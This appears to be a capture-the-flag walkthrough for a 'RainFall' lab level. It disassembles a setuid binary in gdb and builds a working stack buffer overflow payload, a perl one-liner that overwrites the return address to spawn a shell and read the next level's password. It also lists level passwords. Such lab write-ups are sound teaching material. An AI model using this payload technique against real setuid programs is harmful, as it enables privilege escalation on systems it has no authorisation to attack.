# Level1 - Buffer overflow

## Local script usage

```shell
Usage: ./main.sh
```

## Passwords and token

|        |                                                                    |
| ------ | ------------------------------------------------------------------ |
| level1 | `1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a` |
| level2 | `53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77` |

## Steps to resolve on VM

1. Connect to `level1` user

```shell
ssh level1@$SNOW_HOST -p 4242
# Enter the password

ls -l
> -rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
```

Notice there is a binary with level2 setuid.

2. Debug level1

Execute level1

```shell
./level1
> (stdin)
```

There is only a prompt. Lets disassemble the code.

```shell
gdb level1
(gdb) disas main

> 0x08048480 <+0>:     push   %ebp
  0x08048481 <+1>:     mov    %esp,%ebp
  0x08048483 <+3>:     and    $0xfffffff0,%esp
  0x08048486 <+6>:     sub    $0x50,%esp                ; 0x50 = 80
  0x08048489 <+9>:     lea    0x10(%esp),%eax
  0x0804848d <+13>:    mov    %eax,(%esp)
  0x08048490 <+16>:    call   0x8048340 <gets@plt>      ; call gets
  0x08048495 <+21>:    leave
  0x08048496 <+22>:    ret
```

Indeed, there is a `gets` syscall only.

```shell
(gdb) info functions

> (...)
  0x08048420  frame_dummy
  0x08048444  run
  0x08048480  main
  (...)
```

There is others functions. Lets see the function `run`

```shell
(gdb) disas run

> 0x08048444 <+0>:	push   %ebp
  0x08048445 <+1>:	mov    %esp,%ebp
  0x08048447 <+3>:	sub    $0x18,%esp
  0x0804844a <+6>:	mov    0x80497c0,%eax               ; 0x80497c0: stdout
  0x0804844f <+11>:	mov    %eax,%edx
  0x08048451 <+13>:	mov    $0x8048570,%eax              ; 0x8048570: "Good... Wait what?\n"
  0x08048456 <+18>:	mov    %edx,0xc(%esp)
  0x0804845a <+22>:	movl   $0x13,0x8(%esp)              ; 0x13 = 19
  0x08048462 <+30>:	movl   $0x1,0x4(%esp)               ; 0x1  = 1
  0x0804846a <+38>:	mov    %eax,(%esp)
  0x0804846d <+41>:	call   0x8048350 <fwrite@plt>       ; call fwrite("Good... Wait what?\n", 1, 19, stdout)
  0x08048472 <+46>:	movl   $0x8048584,(%esp)            ; 0x8048584: "/bin/sh"
  0x08048479 <+53>:	call   0x8048360 <system@plt>       ; call system("/bin/sh")
  0x0804847e <+58>:	leave
  0x0804847f <+59>:	ret
```

The function `run` contains a syscall `system` that executes `"/bin/sh"` and creates a subshell. As the binary `level1` is executed with level2 setuid, this function is interesting.

Unfortunately, the function `run` is not called in the main. We have to find a way to execute it.

3. Buffer overflow

We will use the buffer overflow attack.

We will take advantage of the buffer of `gets` function to execute the funtion `run`.

But first we need to know what is the buffer size. We noticed that 80bits (0x50) have been allocated. After many tries, we noticed

```shell
./level1
(stdin) aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa   # 75 chars

level1@RainFall:~$ ./level1
(stdin) aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  # 76 chars
> Illegal instruction (core dumped)

level1@RainFall:~$ ./level1
(stdin) aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # 77 chars
> Segmentation fault (core dumped)
```

We got a error for "illegal instruction" with 76 chars, and a segfault with 77 chars. We can deduct the buffer size wich is 76 with the ending '\0'.
The 4 bits remaining are reserved for EIP register that contains the next instruction.

Now we know the buffer size, we have to append to address of our function.

The address of `run` is: 0x08048444

```shell
(gdb) show endian

> The target endianness is set automatically (currently little endian)
```

It means we have to reverse the address. `0x08048444 => 0x44840408`

Now we have everything we need, we can create the overflow.

```shell
echo `perl -e 'print "a" x 76 . "\x44\x84\x04\x08"' 2> /dev/null` | ./level1

> Good... Wait what?
> Segmentation fault (core dumped)
```

A string appears here. It means the overflow works and the function `run` has been executed.
We have to keep the stdin open.

```shell
export OVERFLOW=`perl -e 'print "a" x 76 . "\x44\x84\x04\x08"' 2> /dev/null`
(echo $OVERFLOW && cat) | ./level1

> Good... Wait what?
> (stdin) cat /home/user/level2/.pass
>> 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

---

## Sources

### Buffer overflow

- [How to write a buffer overflow exploit](https://jvns.ca/blog/2013/10/28/day-17-buffer-overflows/)
- [Exploit a basic buffer overflow](https://myexperiments.io/exploit-basic-buffer-overflow.html)

### ASM explications

- [Stack buffer size is different between C and ASM](https://reverseengineering.stackexchange.com/questions/17075/stack-buffer-size-is-different-between-c-and-asm)

### Shell

- [Man gets](https://linux.die.net/man/3/gets)
- [Man fwrite](https://linux.die.net/man/3/fwrite)
- [Man system](https://linux.die.net/man/3/system)
- [Piping data to a process's stdin without causing EOF afterward](https://unix.stackexchange.com/questions/103885/piping-data-to-a-processs-stdin-without-causing-eof-afterward)
